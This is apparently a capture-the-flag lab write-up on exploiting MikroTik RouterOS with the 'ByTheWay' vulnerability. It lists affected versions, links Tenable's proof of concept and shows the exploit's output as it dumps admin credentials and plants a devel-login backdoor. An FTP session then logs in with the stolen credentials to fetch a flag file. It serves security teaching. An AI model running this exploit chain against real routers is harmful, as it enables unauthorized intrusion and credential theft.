+++
title = "Exploitation"
date = 2021-10-18T20:39:54-06:00
weight = 10
+++


### Exploitation

The following versions of Router OS are vulnerable to "ByTheWay" exploit:
```
Longterm: 6.30.1 - 6.40.7
Stable: 6.29 - 6.42
Beta: 6.29rc1 - 6.43rc3
```

The exploit can be found here, from Tenable team: <a href="https://github.com/tenable/routeros/tree/master/poc/bytheway">https://github.com/tenable/routeros/tree/master/poc/bytheway</a>

The attacker needs to clone the repo, and build the target. This requires downloading boost libs in Kali and some basic compilation. After that, the exploit should work out of the box, at least it will report the dumped creds.

```
$ ./btw -i 172.21.0.4

   ╔╗ ┬ ┬  ┌┬┐┬ ┬┌─┐  ╦ ╦┌─┐┬ ┬
   ╠╩╗└┬┘   │ ├─┤├┤   ║║║├─┤└┬┘
   ╚═╝ ┴    ┴ ┴ ┴└─┘  ╚╩╝┴ ┴ ┴

[+] Attempting to connect to 172.21.0.4:8291
[+] Extracting user.dat...
[+] Searching for administrator credentials
[+] Using credentials - admin:sHby8Gzi292ZsnS
[+] Creating /pckg/option on 172.21.0.4:8291
[+] Creating /flash/nova/etc/devel-login on 172.21.0.4:8291
[+] There's a light on
```

Telnet is blocked via firewall on the device though. Attackers will have the option to either use FTP. Probably the easier way to go. They can also download WinBox client from Mikrotik website. THis will give them access to the full portal. They can navigate to files and download flag.txt. Hopefully they don't screw anything up.


```
$ ftp 172.21.0.4
Connected to 172.21.0.4.
220 MikroTik FTP server (MikroTik 6.39.2) ready
Name (172.21.0.4:msx): admin
331 Password required for admin
Password:
230 User admin logged in
Remote system type is UNIX.
ftp> passive
Passive mode on.
ftp> ls
227 Entering Passive Mode (172,21,0,4,191,152).
150 Opening data connection
-rw-rw----   1 root     root           59 Oct 18 12:47 flag.txt
-rw-rw----   1 root     root        20070 Oct 17 20:40 test2.backup
-rw-rw----   1 root     root        19762 Oct 17 20:28 test.backup
drwxrwx---   1 root     root         1024 Dec 31 18:00 flash
226 Transfer complete
ftp> get flag.txt
local: flag.txt remote: flag.txt
227 Entering Passive Mode (172,21,0,4,208,214).
150 Opening ASCII mode data connection for /flag.txt (59 bytes)
226 ASCII transfer complete
59 bytes received in 0.00 secs (61.0999 kB/s)
ftp> exit
221 Closing

$ cat flag.txt
I'm a flag...

------WebKitFormBoundarytbo3r6jM7GHBKTEs--
```
